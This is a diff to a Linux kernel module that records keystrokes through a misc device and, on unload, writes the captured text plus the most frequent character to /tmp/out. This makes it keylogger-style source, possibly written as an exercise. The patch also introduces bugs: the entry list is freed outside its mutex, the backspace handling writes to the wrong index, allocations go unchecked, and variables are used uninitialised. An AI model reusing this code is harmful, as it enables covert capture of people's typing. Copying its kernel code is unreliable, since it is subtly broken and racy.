@@ -111,32 +111,82 @@ int register_misc_device(void)
 	return ret;
 }
 
-void deregister_misc_device(void)
+static char c_frequency(char *buffer)
+{
+	size_t	i = 0;
+	size_t	j = 0;
+	int	freq = 0;
+	int	count = 0;
+	char	res;
+
+
+	while (buffer[i])
+	{
+		count = 0;
+		j = i + 1;
+		while (buffer[j])
+		{
+			if (buffer[i] == buffer[j])
+				count++;
+			j++;
+		}
+		if (count >= freq)
+		{
+			res = buffer[i];
+			freq = count;
+		}
+		i++;
+	}
+	return res;
+}
+
+static void log_and_cleanup(void)
 {
 	struct key_entry 	*entry;
 	struct file		*file;
 	char			*buffer;
+	char			*fbuffer;
+	char			mc;
 	size_t			i = 0;
 	loff_t			pos;
 
-	printk(KERN_INFO "%s: deregister device\n", __func__);
-	misc_deregister(&ct_misc_device);
-
-	mutex_lock(&kps_data.lock);
 	buffer = kmalloc(kps_data.aLen + 2, GFP_KERNEL);
+	fbuffer = kmalloc(kps_data.aLen + 1, GFP_KERNEL);
 	memzero_explicit(buffer, kps_data.aLen + 2);
 	while (!list_empty(&kps_data.entries)) {
 		entry = list_first_entry(&kps_data.entries, struct key_entry, list);
 		if (entry->k_data.ascii_key != 0x0 && entry->state != Released)
-			buffer[i++] = entry->k_data.ascii_key;
+		{
+			buffer[i] = entry->k_data.ascii_key;
+			fbuffer[i] = buffer[i];
+			i++;
+		}
+		else if (entry->keycode == 0x0E && i > 0 && buffer[i - 1] != '\n')
+		{
+			/* Delete the last character */
+			buffer[i--] = '\0';
+		}
 		list_del(&entry->list);
 		kfree(entry);
 	}
+	fbuffer[i] = '\0';
+	mc = c_frequency(fbuffer);
 	buffer[i++] = '\n';
 	buffer[i] = '\0';
-	file = filp_open("/tmp/out", O_WRONLY|O_CREAT, 0);
+	file = filp_open("/tmp/out", O_WRONLY | O_CREAT, 0);
 	kernel_write(file, buffer, i, &pos);
+	kernel_write(file, &"<", 1, &pos);
+	kernel_write(file, &mc, 1, &pos);
+	kernel_write(file, &">", 1, &pos);
 	filp_close(file, NULL);
+}
+
+void deregister_misc_device(void)
+{
+	printk(KERN_INFO "%s: deregister device\n", __func__);
+	misc_deregister(&ct_misc_device);
+	log_and_cleanup();
+	mutex_lock(&kps_data.lock);
 	mutex_unlock(&kps_data.lock);
 }
 
